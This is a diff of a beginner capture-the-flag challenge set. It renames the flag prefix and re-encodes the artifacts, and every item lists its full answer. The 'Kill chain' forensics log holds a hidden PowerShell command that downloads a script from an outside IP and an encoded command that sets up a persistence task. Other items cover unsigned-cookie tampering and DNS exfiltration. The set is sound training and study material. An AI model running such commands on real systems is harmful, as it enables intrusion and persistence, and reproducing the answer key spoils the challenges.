@@ -7,12 +7,12 @@
    "cat": "Web",
    "pts": 100,
    "prompt": "The library's new homepage looks finished. The developer left something behind. Find the flag.",
-   "artifact": "<!doctype html>\n<html lang=\"en\">\n<head><title>Inland State Library</title></head>\n<body>\n  <!-- TODO remove before launch: Q0lTT3t2aWV3X3NvdXJjZV9maXJzdH0= -->\n  <h1>Welcome to the library</h1>\n  <p>Search the catalog below.</p>\n</body>\n</html>",
+   "artifact": "<!doctype html>\n<html lang=\"en\">\n<head><title>Inland State Library</title></head>\n<body>\n  <!-- TODO remove before launch: SFVCe3ZpZXdfc291cmNlX2ZpcnN0fQ== -->\n  <h1>Welcome to the library</h1>\n  <p>Search the catalog below.</p>\n</body>\n</html>",
    "hints": [
     "HTML comments never show on the page, but anyone can read the source.",
     "The string ends in \"=\": that is a Base64 hint. Try From Base64 in the Crypto & Encoding Lab."
    ],
-   "answer": "CISO{view_source_first}",
+   "answer": "HUB{view_source_first}",
    "explain": "Comments, hidden fields and old JavaScript ship to every visitor. Treat page source as public, because it is.",
    "hash": "4046a6082d237b12bf679a5fdd108e3fee1df6ef6c98b0229149c81d83f5485f"
   },
@@ -22,12 +22,12 @@
    "cat": "Network",
    "pts": 100,
    "prompt": "A curl -I against the staging server returned these headers. One of them should not be there.",
-   "artifact": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\nX-Debug-Token: 4349534f7b686561646572735f74656c6c5f73746f726965737d\nCache-Control: no-store",
+   "artifact": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/html; charset=utf-8\nX-Powered-By: Express\nX-Debug-Token: 4855427b686561646572735f74656c6c5f73746f726965737d\nCache-Control: no-store",
    "hints": [
     "Debug headers are for developers, not production.",
     "Only 0-9 and a-f: decode it with From Hex."
    ],
-   "answer": "CISO{headers_tell_stories}",
+   "answer": "HUB{headers_tell_stories}",
    "explain": "Headers leak versions, frameworks and debug data. Strip X-Powered-By and debug headers before production.",
    "hash": "9672a6865a7daaef343107ac8bbc06f47e2f7b6f921c6d888565271a7f7c394d"
   },
@@ -36,13 +36,13 @@
    "title": "Room for hosts",
    "cat": "Network",
    "pts": 100,
-   "prompt": "The lab network is 10.4.0.0/22. How many usable host addresses does it have? Submit CISO{number}.",
+   "prompt": "The lab network is 10.4.0.0/22. How many usable host addresses does it have? Submit HUB{number}.",
    "artifact": "Network: 10.4.0.0/22",
    "hints": [
     "A /22 leaves 32 − 22 = 10 bits for hosts.",
     "2^10 addresses, minus the network and broadcast addresses."
    ],
-   "answer": "CISO{1022}",
+   "answer": "HUB{1022}",
    "explain": "Usable hosts = 2^(32 − prefix) − 2. Subnetting questions show up on every networking exam and every firewall rule.",
    "hash": "f00f2e7bca65e9f8409fdb3bcddfa031664224255d7bd2f6b3de8ff11ababe20"
   },
@@ -51,13 +51,13 @@
    "title": "Dots and dashes",
    "cat": "Crypto",
    "pts": 100,
-   "prompt": "Intercepted on an old radio channel. Words are separated by /. Submit the message in lower case with underscores between words, as CISO{...}.",
+   "prompt": "Intercepted on an old radio channel. Words are separated by /. Submit the message in lower case with underscores between words, as HUB{...}.",
    "artifact": "... .. --. -. .- .-.. ... / .- .-. . / -.. .- - .-",
    "hints": [
     "This is Morse code: short and long signals for each letter.",
     "Look up a Morse chart. ... is S."
    ],
-   "answer": "CISO{signals_are_data}",
+   "answer": "HUB{signals_are_data}",
    "explain": "Encoding is not secrecy. Morse, Base64 and hex are all just different ways of writing the same data.",
    "hash": "9a0a7510b90a54aa0954dc3f28ae8a33db26b888bbf862478966c35f4e4d7a92"
   },
@@ -66,13 +66,13 @@
    "title": "Night shift poem",
    "cat": "Forensics",
    "pts": 100,
-   "prompt": "The night-shift analyst left this poem on the whiteboard. Their manager says it is a message. Submit it as CISO{...} in lower case with underscores.",
+   "prompt": "The night-shift analyst left this poem on the whiteboard. Their manager says it is a message. Submit it as HUB{...} in lower case with underscores.",
    "artifact": "Rain on the server room roof again\nEvery alert gets read before coffee\nAlarms that cry wolf get tuned, not muted\nDo the boring patching first\nTickets close when evidence says so\nHunt for what the dashboards miss\nEach log line is a witness\nEvery shift ends with good notes\nDon't trust, verify\nGaps are where attackers live\nEver forward, never blame\nStay curious",
    "hints": [
     "Look at the edges of the poem, not the middle.",
     "Read the first letter of each line, top to bottom. It splits into three words."
    ],
-   "answer": "CISO{read_the_edges}",
+   "answer": "HUB{read_the_edges}",
    "explain": "An acrostic hides a message in plain sight. Steganography is the same idea with pixels and audio: the data is there if you know where to look.",
    "hash": "6b47b6231a4ed13eb5320799b8753977e8ab9917a1cfe186df25199809f8fa7d"
   },
@@ -81,13 +81,13 @@
    "title": "Where did it really come from?",
    "cat": "Forensics",
    "pts": 200,
-   "prompt": "A \"payroll\" email asked staff to update bank details. Which IP address actually sent it? Submit CISO{ip}.",
+   "prompt": "A \"payroll\" email asked staff to update bank details. Which IP address actually sent it? Submit HUB{ip}.",
    "artifact": "Return-Path: <bounce@mailer.example.org>\nReceived: from mail.isu.example (mail.isu.example [192.0.2.25])\n\tby mx.isu.example with ESMTPS id 7Fq2; Tue, 21 Oct 2026 08:14:09 -0700\nReceived: from unknown (HELO desktop-7Q2) (203.0.113.45)\n\tby mail.isu.example with SMTP id 9Kd1; Tue, 21 Oct 2026 08:14:07 -0700\nAuthentication-Results: mx.isu.example; spf=fail smtp.mailfrom=mailer.example.org; dkim=none; dmarc=fail header.from=isu.example\nFrom: \"Payroll\" <payroll@isu.example>\nReply-To: payroll-update@isu-hr.example.net\nSubject: Action required: confirm your direct deposit",
    "hints": [
     "Each mail server adds a Received line on top. The oldest hop is at the bottom.",
     "Find the bottom Received line and the IP in brackets after HELO."
    ],
-   "answer": "CISO{203.0.113.45}",
+   "answer": "HUB{203.0.113.45}",
    "explain": "From is easy to fake; Received chains, SPF and DMARC results are where the truth is. The Reply-To on a lookalike domain is the giveaway.",
    "hash": "eb4b2dd34d5ba9aff5f39480c21f10aff75f58d1bfe56c0d153cb60b63533992"
   },
@@ -96,13 +96,13 @@
    "title": "Night-time login",
    "cat": "Forensics",
    "pts": 200,
-   "prompt": "web02 was quiet overnight, or was it? Which account was broken into, and at what time (HHMM)? Submit CISO{user_HHMM}.",
+   "prompt": "web02 was quiet overnight, or was it? Which account was broken into, and at what time (HHMM)? Submit HUB{user_HHMM}.",
    "artifact": "Oct 21 02:09:51 web02 sshd[811]: Failed password for admin from 198.51.100.9 port 50211 ssh2\nOct 21 02:10:02 web02 sshd[811]: Failed password for root from 198.51.100.9 port 50215 ssh2\nOct 21 02:11:40 web02 sshd[812]: Accepted publickey for mlopez from 10.0.5.23 port 51900 ssh2\nOct 21 02:12:15 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50290 ssh2\nOct 21 02:13:30 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50301 ssh2\nOct 21 02:14:44 web02 sshd[814]: Failed password for test from 192.0.2.80 port 41000 ssh2\nOct 21 02:15:02 web02 sshd[813]: Failed password for webadmin from 198.51.100.9 port 50318 ssh2\nOct 21 02:16:12 web02 sshd[815]: Failed password for webadmin from 198.51.100.9 port 50330 ssh2\nOct 21 02:17:26 web02 sshd[815]: Accepted password for webadmin from 198.51.100.9 port 50342 ssh2\nOct 21 02:17:27 web02 systemd-logind[402]: New session 41 of user webadmin.\nOct 21 02:19:03 web02 sudo:  webadmin : TTY=pts/2 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/bin/crontab -e",
    "hints": [
     "Follow 198.51.100.9 from line to line.",
     "Find the first \"Accepted\" for that IP after its failures. Use its minute, not the session line."
    ],
-   "answer": "CISO{webadmin_0217}",
+   "answer": "HUB{webadmin_0217}",
    "explain": "Failures then success from the same address is the brute-force pattern. The sudo crontab edit two minutes later is the attacker setting up persistence.",
    "hash": "758825372596a3f91bcb66bbe67add6d1a1fdf52216d34077f4e5a29b508b937"
   },
@@ -111,13 +111,13 @@
    "title": "Who is knocking?",
    "cat": "Forensics",
    "pts": 200,
-   "prompt": "How many different IP addresses sent MORE than 3 POST requests to /wp-login.php? Submit CISO{number}.",
+   "prompt": "How many different IP addresses sent MORE than 3 POST requests to /wp-login.php? Submit HUB{number}.",
    "artifact": "10.0.5.44 - - [21/Oct/2026:03:10:00] \"POST /wp-login.php HTTP/1.1\" 200 512\n192.0.2.140 - - [21/Oct/2026:03:11:00] \"POST /wp-login.php HTTP/1.1\" 401 512\n10.0.5.31 - - [21/Oct/2026:03:11:30] \"GET /index.php HTTP/1.1\" 200 8812\n198.51.100.12 - - [21/Oct/2026:03:12:00] \"POST /wp-login.php HTTP/1.1\" 401 512\n198.51.100.77 - - [21/Oct/2026:03:13:00] \"POST /wp-login.php HTTP/1.1\" 401 512\n203.0.113.90 - - [21/Oct/2026:03:14:00] \"POST /wp-login.php HTTP/1.1\" 401 512\n192.0.2.140 - - [21/Oct/2026:03:15:01] \"POST /wp-login.php HTTP/1.1\" 401 512\n10.0.5.31 - - [21/Oct/2026:03:15:30] \"GET /index.php HTTP/1.1\" 200 8812\n198.51.100.12 - - [21/Oct/2026:03:16:01] \"POST /wp-login.php HTTP/1.1\" 401 512\n198.51.100.77 - - [21/Oct/2026:03:17:01] \"POST /wp-login.php HTTP/1.1\" 401 512\n203.0.113.90 - - [21/Oct/2026:03:18:01] \"POST /wp-login.php HTTP/1.1\" 401 512\n192.0.2.140 - - [21/Oct/2026:03:19:02] \"POST /wp-login.php HTTP/1.1\" 401 512\n10.0.5.31 - - [21/Oct/2026:03:19:30] \"GET /index.php HTTP/1.1\" 200 8812\n198.51.100.77 - - [21/Oct/2026:03:20:02] \"POST /wp-login.php HTTP/1.1\" 401 512\n203.0.113.90 - - [21/Oct/2026:03:21:02] \"POST /wp-login.php HTTP/1.1\" 401 512\n192.0.2.140 - - [21/Oct/2026:03:22:03] \"POST /wp-login.php HTTP/1.1\" 401 512\n203.0.113.90 - - [21/Oct/2026:03:23:03] \"POST /wp-login.php HTTP/1.1\" 401 512\n10.0.5.31 - - [21/Oct/2026:03:23:30] \"GET /index.php HTTP/1.1\" 200 8812\n192.0.2.140 - - [21/Oct/2026:03:24:04] \"POST /wp-login.php HTTP/1.1\" 401 512\n203.0.113.90 - - [21/Oct/2026:03:25:04] \"POST /wp-login.php HTTP/1.1\" 401 512\n192.0.2.140 - - [21/Oct/2026:03:26:05] \"POST /wp-login.php HTTP/1.1\" 401 512",
    "hints": [
     "Only count POST /wp-login.php lines.",
     "Tally per IP. 3 exactly does not count: it must be more than 3."
    ],
-   "answer": "CISO{2}",
+   "answer": "HUB{2}",
    "explain": "Counting and thresholds are most of detection engineering. Write the rule, then check it against the boundary cases (exactly 3).",
    "hash": "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"
   },
@@ -126,13 +126,13 @@
    "title": "Secret knock",
    "cat": "Network",
    "pts": 200,
-   "prompt": "SSH on 192.0.2.10 is closed to everyone, yet one address got in. What sequence of ports opened the door? Submit CISO{port-port-port}.",
+   "prompt": "SSH on 192.0.2.10 is closed to everyone, yet one address got in. What sequence of ports opened the door? Submit HUB{port-port-port}.",
    "artifact": "Oct 21 04:01:02 fw01 BLOCK TCP 203.0.113.5:40100 -> 192.0.2.10:23\nOct 21 04:02:13 fw01 BLOCK TCP 198.51.100.40:51000 -> 192.0.2.10:7311\nOct 21 04:02:13 fw01 BLOCK TCP 203.0.113.5:40101 -> 192.0.2.10:3389\nOct 21 04:02:14 fw01 BLOCK TCP 198.51.100.40:51001 -> 192.0.2.10:8122\nOct 21 04:02:15 fw01 BLOCK TCP 198.51.100.40:51002 -> 192.0.2.10:9033\nOct 21 04:02:16 fw01 RULE knockd: open 22 for 198.51.100.40\nOct 21 04:02:17 fw01 ALLOW TCP 198.51.100.40:51003 -> 192.0.2.10:22\nOct 21 04:03:40 fw01 BLOCK TCP 203.0.113.5:40102 -> 192.0.2.10:22",
    "hints": [
     "Follow only 198.51.100.40.",
     "Its blocked ports, in order, right before the knockd line."
    ],
-   "answer": "CISO{7311-8122-9033}",
+   "answer": "HUB{7311-8122-9033}",
    "explain": "Port knocking hides a service until a secret sequence arrives. It is obscurity, not authentication: anyone watching the traffic can replay it.",
    "hash": "4d0fcd347396e4827d333489a7cdcb63e537e6d3b8d20377b1df15eb0a3d9a8b"
   },
@@ -142,12 +142,12 @@
    "cat": "Crypto",
    "pts": 200,
    "prompt": "Same flag format as always, but every letter was shifted by an amount nobody wrote down.",
-   "artifact": "NTDZ{dstqe_slaapyd}",
+   "artifact": "SFM{dstqe_slaapyd}",
    "hints": [
-    "Every flag starts with C. What letter is here instead?",
-    "N is 11 letters after C. Use Caesar shift with -11."
+    "Every flag starts with H. What letter is here instead?",
+    "S is 11 letters after H. Use Caesar shift with -11."
    ],
-   "answer": "CISO{shift_happens}",
+   "answer": "HUB{shift_happens}",
    "explain": "Caesar has only 25 keys, and a known prefix gives the key away instantly. That is why real ciphers have enormous key spaces.",
    "hash": "b81771d413eeb0fa7681fcb585e7a2f879ea318d4300df7d157ff88ddbf815b1"
   },
@@ -157,13 +157,13 @@
    "cat": "Crypto",
    "pts": 300,
    "prompt": "Pulled from a malware config. It was XORed with one byte, then Base64-encoded. Unwrap it.",
-   "artifact": "cHpgfEhRUkBWBQdsR1tWXWxLXEFsR1tWXWxKXEZO",
+   "artifact": "e2ZxSFFSQFYFB2xHW1ZdbEtcQWxHW1ZdbEpcRk4=",
    "hints": [
     "Undo the outer layer first: From Base64, then To Hex so the XOR step can read it.",
-    "The first byte should be \"C\" (hex 43). First hex byte XOR 43 gives the key.",
+    "The first byte should be \"H\" (hex 48). First hex byte XOR 48 gives the key.",
     "The key is 51."
    ],
-   "answer": "CISO{base64_then_xor_then_you}",
+   "answer": "HUB{base64_then_xor_then_you}",
    "explain": "Malware stacks cheap transforms to dodge string scanners. Known plaintext (the flag prefix, a URL, MZ in an executable) breaks them fast.",
    "hash": "4f857608e4131e5a0b80777f56ca1a895e1b6378f23fa43e92cbb4e468529ed7"
   },
@@ -172,13 +172,13 @@
    "title": "Trust issues",
    "cat": "Web",
    "pts": 300,
-   "prompt": "The course portal stores your session in this cookie, with no signature, and the server reads it as-is. Which field and value would turn you into an administrator? Submit CISO{field_value}.",
+   "prompt": "The course portal stores your session in this cookie, with no signature, and the server reads it as-is. Which field and value would turn you into an administrator? Submit HUB{field_value}.",
    "artifact": "Set-Cookie: session=eyJ1c2VyIjoiamNoZW4iLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTc5MzAwMDAwMH0; Path=/; Secure\n\n// portal.js (served to every visitor)\nconst s = JSON.parse(atob(cookie.replace(/-/g, \"+\").replace(/_/g, \"/\")));\nif (s.role === \"staff_admin\") showGradebookEditor();",
    "hints": [
     "Decode the cookie value with From Base64URL.",
     "Compare its role with the value the JavaScript checks for."
    ],
-   "answer": "CISO{role_staff_admin}",
+   "answer": "HUB{role_staff_admin}",
    "explain": "Anything the client holds, the client can change. Sessions must be signed (or kept server-side) and every permission checked on the server.",
    "hash": "6ae5cd58f1e7bfa04a7ef07cbe5543ccbb5dbb3ecf3ccd846525ff97cdd3117b"
   },
@@ -188,12 +188,12 @@
    "cat": "Network",
    "pts": 300,
    "prompt": "A host is smuggling data out in DNS queries, out of order. Put it back together.",
-   "artifact": "10.0.5.52 -> 10.0.5.1  A     www.example.com\n10.0.5.52 -> 10.0.5.1  TXT   02-6c65616b735f696e5f.s.exfil-cdn.example.org\n10.0.5.23 -> 10.0.5.1  A     updates.example.com\n10.0.5.52 -> 10.0.5.1  TXT   03-7069656365737d.s.exfil-cdn.example.org\n10.0.5.52 -> 10.0.5.1  TXT   01-4349534f7b646e735f.s.exfil-cdn.example.org\n10.0.5.31 -> 10.0.5.1  AAAA  portal.csusb.example.edu",
+   "artifact": "10.0.5.52 -> 10.0.5.1  A     www.example.com\n10.0.5.52 -> 10.0.5.1  TXT   02-6c65616b735f696e5f.s.exfil-cdn.example.org\n10.0.5.23 -> 10.0.5.1  A     updates.example.com\n10.0.5.52 -> 10.0.5.1  TXT   03-7069656365737d.s.exfil-cdn.example.org\n10.0.5.52 -> 10.0.5.1  TXT   01-4855427b646e735f.s.exfil-cdn.example.org\n10.0.5.31 -> 10.0.5.1  AAAA  portal.csusb.example.edu",
    "hints": [
     "Only the TXT queries to exfil-cdn.example.org matter.",
     "Each label starts with a sequence number. Sort by it, join the hex after the dash, then From Hex."
    ],
-   "answer": "CISO{dns_leaks_in_pieces}",
+   "answer": "HUB{dns_leaks_in_pieces}",
    "explain": "DNS tunnels chunk data across queries. Reassembly is how you prove what left the network, and long random-looking labels to one domain are how you spot it.",
    "hash": "fbe14f638599ac65c1d7f99f6ccdc18131f8571feca6c6e46588157f97e4c651"
   },
@@ -202,13 +202,13 @@
    "title": "Which download is real?",
    "cat": "Crypto",
    "pts": 300,
-   "prompt": "Four mirrors serve \"setup-2.4.1.zip\". The vendor publishes one SHA-256. Each file's contents are shown as text. Which file is genuine? Submit CISO{file name}.",
+   "prompt": "Four mirrors serve \"setup-2.4.1.zip\". The vendor publishes one SHA-256. Each file's contents are shown as text. Which file is genuine? Submit HUB{file name}.",
    "artifact": "Vendor-published SHA-256: 4b78d2516f1e464816661bbd020b756b497c12ca3ed7511b6187bc34647678b7\n\nsetup-2.4.1-a.zip: \"PK..CyberHub installer build a\"\nsetup-2.4.1-b.zip: \"PK..CyberHub installer build b\"\nsetup-2.4.1-c.zip: \"PK..CyberHub installer build c\"\nsetup-2.4.1-d.zip: \"PK..CyberHub installer build d\"",
    "hints": [
     "Paste each file's quoted contents (without the quotes) into the Crypto & Encoding Lab input.",
     "Press \"SHA-256 the input\" and compare with the published hash."
    ],
-   "answer": "CISO{setup-2.4.1-c.zip}",
+   "answer": "HUB{setup-2.4.1-c.zip}",
    "explain": "Verifying a hash from a separate, trusted channel is how you know a download was not swapped. A hash next to the file on the same mirror proves nothing.",
    "hash": "e2546ab5ced4fa55d1048174660e61208b8c5bf32d8c2fde76b76088f3c91ec6"
   },
@@ -217,13 +217,13 @@
    "title": "Who wins?",
    "cat": "Cloud",
    "pts": 400,
-   "prompt": "The reporting role has the policy below. Can it delete objects in reports-prod? Submit CISO{allow or deny_Sid of the deciding statement}, for example CISO{allow_ReadAll}.",
+   "prompt": "The reporting role has the policy below. Can it delete objects in reports-prod? Submit HUB{allow or deny_Sid of the deciding statement}, for example HUB{allow_ReadAll}.",
    "artifact": "{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"ReadAll\",\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:GetObject\",\n        \"s3:ListBucket\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::reports-*\",\n        \"arn:aws:s3:::reports-*/*\"\n      ]\n    },\n    {\n      \"Sid\": \"ManageReports\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"s3:*\",\n      \"Resource\": \"arn:aws:s3:::reports-*/*\"\n    },\n    {\n      \"Sid\": \"BlockProdDeletes\",\n      \"Effect\": \"Deny\",\n      \"Action\": [\n        \"s3:DeleteObject\",\n        \"s3:DeleteObjectVersion\"\n      ],\n      \"Resource\": \"arn:aws:s3:::reports-prod/*\"\n    }\n  ]\n}",
    "hints": [
     "ManageReports allows s3:* on every reports bucket, including prod.",
     "In AWS, an explicit Deny always beats any Allow."
    ],
-   "answer": "CISO{deny_BlockProdDeletes}",
+   "answer": "HUB{deny_BlockProdDeletes}",
    "explain": "Policy evaluation: explicit Deny > explicit Allow > implicit deny. Guardrails like this survive someone later attaching a broad Allow.",
    "hash": "b5387e1efa1e2dd8cac4fef6559ab53887d667b2c1e61ac46fc4f3c868ef8d5b"
   },
@@ -232,14 +232,14 @@
    "title": "Kill chain",
    "cat": "Forensics",
    "pts": 500,
-   "prompt": "Three log sources, one incident. The attacker set up something to survive a reboot. What is it called? Submit CISO{name}.",
+   "prompt": "Three log sources, one incident. The attacker set up something to survive a reboot. What is it called? Submit HUB{name}.",
    "artifact": "== mail gateway ==\n09:02:11 delivered  to=jchen@isu.example  from=billing@invoices-isu.example.net  attachment=Invoice_Oct.docm  verdict=clean\n\n== proxy ==\n09:05:40 10.0.5.31 GET http://198.51.100.7/s.txt 200 text/plain 412 bytes\n09:05:41 10.0.5.31 GET https://www.example.com/ 200\n\n== endpoint process log (10.0.5.31) ==\n09:05:02 explorer.exe -> WINWORD.EXE \"C:\\Users\\jchen\\Downloads\\Invoice_Oct.docm\"\n09:05:38 WINWORD.EXE -> powershell.exe -nop -w hidden -c \"iwr http://198.51.100.7/s.txt\"\n09:05:43 powershell.exe -> powershell.exe -nop -enc c2NodGFza3MgL2NyZWF0ZSAvdG4gIk9uZURyaXZlVXBkYXRlQ2hlY2siIC90ciAiQzpcVXNlcnNcUHVibGljXG9kdS5leGUiIC9zYyBob3VybHk=\n09:05:44 powershell.exe -> schtasks.exe (see parent command line)\n09:20:00 svchost.exe -> odu.exe",
    "hints": [
     "Start at the email, then follow WINWORD.EXE in the process log.",
     "The -enc argument is Base64 (real PowerShell uses UTF-16LE; this one is plain UTF-8). Decode it.",
     "schtasks /tn sets the scheduled task name."
    ],
-   "answer": "CISO{OneDriveUpdateCheck}",
+   "answer": "HUB{OneDriveUpdateCheck}",
    "explain": "Phishing email, macro, download cradle, encoded command, scheduled task: the full chain. Each step had a chance to stop it: attachment policy, macro blocking, egress filtering, script logging, and alerting on new scheduled tasks.",
    "hash": "7b440d0da3afceca8d62e448f61f56f588be444c53336eb81d7d8461781ff0bf"
   }
